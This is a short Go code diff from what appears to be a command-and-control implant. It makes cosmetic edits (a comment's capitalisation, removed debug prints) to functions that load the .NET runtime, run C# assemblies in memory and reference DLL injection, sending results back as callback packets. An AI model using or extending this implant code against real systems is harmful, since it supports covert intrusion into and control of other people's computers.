@@ -50,7 +50,7 @@ func WebDelivery(b []byte) {
 
 // it seems that some user custom plugins will use ExecAsm to inject dll,
 // maybe because normal inject dll doesn't accept args?
-// use go to execute C#, and dll inject to execute dll with args
+// use Go to execute C#, and dll inject to execute dll with args
 func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
 	// execAsm don't need to handle job
 	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
@@ -128,17 +128,14 @@ func execAsmGo(b []byte) error {
 		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
 	}
 	runtimeHost, err := clr.LoadCLR("v4")
-	//util.Println("after loadCLR")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadCLR error: %s", err))
 	}
 	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
-	//util.Println("after LoadAssembly")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
-	//util.Println("after InvokeAssembly")
 	if stdout != "" {
 		packet.PushResult(int(callBackType), []byte(stdout))
 	}
